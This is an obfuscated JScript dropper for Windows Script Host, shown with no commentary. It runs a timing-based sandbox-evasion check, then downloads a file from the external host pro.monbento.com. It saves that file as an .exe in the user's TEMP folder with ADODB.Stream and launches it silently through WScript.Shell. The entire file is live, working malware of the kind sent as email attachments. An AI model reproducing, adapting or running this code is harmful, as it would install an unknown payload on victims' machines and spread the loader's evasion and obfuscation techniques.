var _GE = false;
var _HB = "CreateObject";
var _R = function _H() {return WScript[_HB]("WScript"+".Shell");}(), _T0 = 11;
var _Y0 = "MSXML2.XMLHTTP";
var _U = 2123213;
var _WJ = 0;
function _E(_RW){_R["Run"](_RW, _WJ, _WJ);};
function _X(){return _Y0 + "";};
function _Y(_NK, _G1){_WJ = _WJ * 1; return _NK - _G1;};
function _TU(){return _HB;};
/*@cc_on
  @if (@_win32 || @_win64)
    _GE = true;
  @end
@*/
if (_GE)
{
var _ZB = "";
function _G(){return 22;};
var _VH = 0; var _T = 0;
function _H0()
{
var _UR = new this["Date"]();
var _K = _UR["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _UR = new this["Date"]();
var _I0 = _UR["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _UR = new this["Date"]();
var _XW = _UR["getUTCMilliseconds"]();
var _VH = "_W";
_VH = _Y(_I0, _K);
var _T = "_I";
_T = _Y(_XW, _I0);
_ZB = "open";
return _Y(_VH, _T);
}
var _HB0 = false;
var _J0 = false;
for (var _B = _WJ; _B < _G() * 1; _B++){if (_H0() != _WJ){
_HB0 = true; 
_T = "31" + 11 * _VH + _T; 
_J0 = true; 
break;
}}
function _P() {return ((_HB0 == true) && (_HB0 == _J0)) ? 1 : _WJ;};
if (_HB0 && _P() && _J0){
function _O() {return _R["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "g8f9loSbrr.ex" + "e";};
 _CV = _X();
 _G0 = WScript[_HB](_CV);
 var _J = 1;
 while (_J){
try {
	if (_J == 1)
	{
		_G0[_ZB]("GET", "http://pro.monbento.com/n3iska", false);
		_G0["send"]();
		_AN = "Sleep";
	}
	WScript[_AN](_G() + 120); 
	if (_G0["readystate"] < 2 * 2) continue;
	_J = _WJ;
	function _NW(_Q0) {var _RP = (1, 2, 3, 4, 5, _Q0); return _RP;};
	_JC = WScript[_TU()]("ADODB.Stream");
	_CV = _JC;
	_CV[_ZB]();
	_CV["type"] = _NW(1);
	_CV["write"](_G0["ResponseBody"]);
	_JC["position"] = _NW(_WJ);
	_CV["Save" + "ToFile"](_O(), 2);
	_JC["cl"+"ose"]();
	_Q = _O();
	_E(_Q);
} catch(_CM){};
}
}
}

